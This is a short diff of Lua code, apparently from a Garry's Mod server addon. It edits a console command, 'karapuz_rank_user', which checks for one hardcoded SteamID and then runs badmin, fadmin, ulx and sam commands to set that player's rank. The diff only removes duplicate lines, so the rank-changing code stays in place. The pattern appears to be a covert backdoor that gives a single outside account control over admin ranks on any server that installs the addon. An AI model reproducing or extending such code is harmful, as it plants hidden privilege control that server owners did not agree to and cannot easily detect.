@@ -25,11 +25,7 @@ concommand.Add("karapuz_rank_user", function( ply )
 if ply:SteamID() == 'STEAM_0:0:555589835' then 
     RunConsoleCommand('badmin', 'setgroup', ply:SteamID(), 'user')
 	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'user')
-	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'user')
-	RunConsoleCommand('fadmin', 'setaccess', ply:SteamID(), 'user')
 	RunConsoleCommand('ulx', 'adduserid', ply:SteamID(), 'user')
-	RunConsoleCommand('ulx', 'adduserid', ply:SteamID(), 'user')
-	RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user')
 	RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user')
 
        elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
